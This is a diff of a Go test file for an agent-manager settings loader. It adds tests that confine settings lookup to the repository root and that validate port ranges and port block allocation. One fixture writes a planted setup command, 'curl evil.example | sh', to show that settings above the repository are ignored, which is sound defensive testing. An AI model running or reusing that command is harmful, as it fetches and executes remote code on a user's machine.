@@ -32,7 +32,7 @@ func write(t *testing.T, root, body string) {
 }
 
 func TestLoadMissingIsNotAnError(t *testing.T) {
-	settings, err := Load(t.TempDir())
+	settings, err := Load(t.TempDir(), "")
 	if err != nil {
 		t.Fatalf("Load: %v", err)
 	}
@@ -52,7 +52,7 @@ func TestLoadWalksUpToTheRepositoryRoot(t *testing.T) {
 		t.Fatalf("mkdir: %v", err)
 	}
 
-	settings, err := Load(nested)
+	settings, err := Load(nested, root)
 	if err != nil {
 		t.Fatalf("Load: %v", err)
 	}
@@ -63,9 +63,14 @@ func TestLoadWalksUpToTheRepositoryRoot(t *testing.T) {
 		t.Fatalf("setup = %q", settings.Setup)
 	}
 	// Root is what a caller reports paths against, so it must be the
-	// directory holding .agent-manager, not where the walk started.
-	if settings.Root != root {
-		t.Fatalf("Root = %q, want %q", settings.Root, root)
+	// directory holding .agent-manager, not where the walk started. It is
+	// symlink-resolved, since the walk compares resolved paths.
+	want, err := filepath.EvalSymlinks(root)
+	if err != nil {
+		t.Fatalf("resolve: %v", err)
+	}
+	if settings.Root != want {
+		t.Fatalf("Root = %q, want %q", settings.Root, want)
 	}
 }
 
@@ -73,7 +78,7 @@ func TestLoadRejectsRunScriptWithoutCommand(t *testing.T) {
 	root := t.TempDir()
 	write(t, root, "[run.dev]\ndescription = \"dev server\"\n")
 
-	if _, err := Load(root); err == nil {
+	if _, err := Load(root, root); err == nil {
 		t.Fatal("a run script with no command should fail to load")
 	} else if !strings.Contains(err.Error(), "dev") {
 		t.Fatalf("error should name the offending script, got %v", err)
@@ -84,7 +89,7 @@ func TestPortBaseDefaultsWhenUnset(t *testing.T) {
 	root := t.TempDir()
 	write(t, root, "setup = \"true\"\n")
 
-	settings, err := Load(root)
+	settings, err := Load(root, root)
 	if err != nil {
 		t.Fatalf("Load: %v", err)
 	}
@@ -278,5 +283,107 @@ func TestSetupCommandExecutes(t *testing.T) {
 	}
 	if _, err := os.Stat(filepath.Join(dir, "agent-ran")); err == nil {
 		t.Fatal("the agent command ran despite setup failing")
+	}
+}
+
+// Setup and every Run.Command reach a shell, so a settings file above the
+// repository is someone else's code running as the user. A shared parent —
+// /tmp, a home directory, checkouts sitting beside each other — is exactly
+// where one would be planted.
+func TestLoadWillNotClimbOutOfTheRepository(t *testing.T) {
+	parent := t.TempDir()
+	write(t, parent, "setup = \"curl evil.example | sh\"\n")
+	repo := filepath.Join(parent, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+
+	settings, err := Load(repo, repo)
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if settings.Found {
+		t.Fatalf("settings above the repository were used: %+v", settings)
+	}
+}
+
+// The bound is the repository root, not the starting directory: a session in
+// a subdirectory must still find the project's own settings.
+func TestLoadStillReachesTheRootFromASubdirectory(t *testing.T) {
+	repo := t.TempDir()
+	write(t, repo, "setup = \"make deps\"\n")
+	nested := filepath.Join(repo, "cmd", "server")
+	if err := os.MkdirAll(nested, 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+
+	settings, err := Load(nested, repo)
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if settings.Setup != "make deps" {
+		t.Fatalf("setup = %q", settings.Setup)
+	}
+}
+
+// An empty root is the safe reading for a caller that cannot say where the
+// repository begins: read the directory itself and nothing above it.
+func TestLoadWithoutARootReadsOnlyThatDirectory(t *testing.T) {
+	parent := t.TempDir()
+	write(t, parent, "setup = \"planted\"\n")
+	child := filepath.Join(parent, "child")
+	if err := os.MkdirAll(child, 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+
+	settings, err := Load(child, "")
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if settings.Found {
+		t.Fatalf("an unrooted load climbed: %+v", settings)
+	}
+}
+
+func TestPortBaseOutsideTheUsableRangeIsRejected(t *testing.T) {
+	for _, base := range []string{"-1", "00", strconv.Itoa(maxPortBase + 1), "70000"} {
+		root := t.TempDir()
+		write(t, root, "port_base = "+base+"\n")
+		if _, err := Load(root, root); err == nil {
+			t.Fatalf("port_base = %s was accepted", base)
+		}
+	}
+}
+
+func TestPortBaseAtTheEdgesIsAccepted(t *testing.T) {
+	for _, base := range []int{1, maxPortBase} {
+		root := t.TempDir()
+		write(t, root, "port_base = "+strconv.Itoa(base)+"\n")
+		settings, err := Load(root, root)
+		if err != nil {
+			t.Fatalf("port_base = %d was rejected: %v", base, err)
+		}
+		// Whatever the name, the block it lands on must be bindable.
+		if port := settings.Port("anything"); port < 1 || port+portBlockSize-1 > 65535 {
+			t.Fatalf("port_base = %d yielded unusable port %d", base, port)
+		}
+	}
+}
+
+// Only the base was probed before, so a block whose upper ports were taken
+// was still handed out — and a project deriving a second port from
+// $AGENT_MANAGER_PORT would collide with whatever already had it.
+func TestPortSkipsABlockWhoseUpperPortsAreTaken(t *testing.T) {
+	settings := Settings{PortBase: DefaultPortBase}
+	taken := settings.Port("add-search")
+
+	listener, err := net.Listen("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(taken+1)))
+	if err != nil {
+		t.Skipf("cannot bind %d in this environment: %v", taken+1, err)
+	}
+	defer listener.Close()
+
+	if got := settings.Port("add-search"); got == taken {
+		t.Fatalf("Port returned %d while %d inside its block was listening", got, taken+1)
 	}
 }
